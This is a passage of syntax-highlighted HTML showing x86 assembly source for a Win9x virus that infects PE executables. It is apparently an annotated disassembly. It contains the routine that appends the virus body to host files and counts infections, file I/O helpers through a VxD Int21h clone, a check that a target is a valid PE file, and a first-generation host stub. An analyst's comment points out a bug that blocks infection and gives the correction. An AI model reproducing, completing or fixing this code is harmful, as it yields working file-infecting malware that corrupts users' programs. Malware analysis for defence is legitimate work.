        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MoveFilePointer</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EDX = Pointer to virus in stack</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; ECX = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ch</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; Append 400h bytes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Write2File</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InfCounter</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Increase inf. counter</span><span class="sc0">

</span><span class="sc5">CloseAndQuit</span><span class="sc4">:</span><span class="sc0">               </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Save EAX</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CloseFile</span><span class="sc0">               </span><span class="sc1">; Close opened file</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Restore EAX</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Get File Attributes</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">GetAttributes</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; AX = Function GetFileAttributes</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4300h</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convert word AX in dword EAX</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileAttributes</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDX = Pointer to file name</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Move the file pointer to the desired address</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">MoveFilePointer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Save EBX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">                 </span><span class="sc1">; AH = Function SetFilePointer</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convert word AX in dword EAX</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                  </span><span class="sc1">; AL = Where set pointer</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EBX = File Handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Restore EBX</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Open file for Read/Write</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">OpenFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3D02h</span><span class="sc0">               </span><span class="sc1">; AX = Open for read/write</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convert word AX into dword EAX</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileAttributes</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; EDX = Pointer filename to open</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; ECX = Attributes</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Read given bytes from opened file</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">ReadFromFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3F00h</span><span class="sc0">               </span><span class="sc1">; AX = ReadFile function</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convert word AX into dword EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EBX = File Handle</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">buffer</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; EDX = Where put read data</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Write desired data to opened file</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Write2File</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Save EBX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4000h</span><span class="sc0">               </span><span class="sc1">; AX = Write function</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; Convert word AX in dword EAX</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EBX = File Handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">                  </span><span class="sc1">; Win9X Int21h's clone</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                     </span><span class="sc1">; Restore EBX</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Close the previously opened file</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CloseFile</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3E00h</span><span class="sc0">               </span><span class="sc1">; AX = Close File function</span><span class="sc0">
        </span><span class="sc6">cwde</span><span class="sc0">                            </span><span class="sc1">; EDX = 0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; EBX = File handle</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Int21h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; Check for a valid PE file</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">CheckValidPE</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">40h</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; Go firstly to 3Ch field in</span><span class="sc0">
        </span><span class="sc6">lodsd</span><span class="sc0">                           </span><span class="sc1">; the PE header, and later check</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; the offset that it marks</span><span class="sc0">
        </span><span class="sc6">lodsw</span><span class="sc0">                           </span><span class="sc1">; and see if points to the</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EP'</span><span class="sc0">                </span><span class="sc1">; PE mark :)</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">ErrorExit</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0"> 
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; Fix ESI, so it'll point to the</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">                     </span><span class="sc1">; beginning of PE header again</span><span class="sc0">

</span><span class="sc1">; VERY IMPORTANT BUG!</span><span class="sc0">
</span><span class="sc1">; The number of sections variable is a word in the PE header, not a dword. So</span><span class="sc0">
</span><span class="sc1">; with the below code, the virus will put some shit in the more significant</span><span class="sc0">
</span><span class="sc1">; word of EAX, that will make the checks to fail, and return an error instead</span><span class="sc0">
</span><span class="sc1">; of infecting a file that could be infected :(</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">; Tries to put in EAX the number</span><span class="sc0">
                                        </span><span class="sc1">; of sections</span><span class="sc0">

</span><span class="sc1">; It should be MOVZX EAX,WORD PTR [ESI+6], or MOV AX,[ESI+6] / CWDE</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">                     </span><span class="sc1">; Increase it</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28h</span><span class="sc0">
        </span><span class="sc6">mul</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc2">40h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">400h</span><span class="sc0">               </span><span class="sc1">; Section table too big?</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">ErrorExit</span><span class="sc0">               </span><span class="sc1">; If so, quit with error</span><span class="sc0">

</span><span class="sc5">GlobalExit</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; Restore values from stack</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc5">ErrorExit</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc1">; ...</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0"> 
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">GlobalExit</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; The pseudo INT 21h</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">Int21h</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">2A0010h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:</span><span class="sc2">14h</span><span class="sc0">
        </span><span class="sc6">retn</span><span class="sc0"> 

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; First generation fake host</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">first_generation</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0FFh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">virus_start</span><span class="sc0">



</span></div></body>
</html>
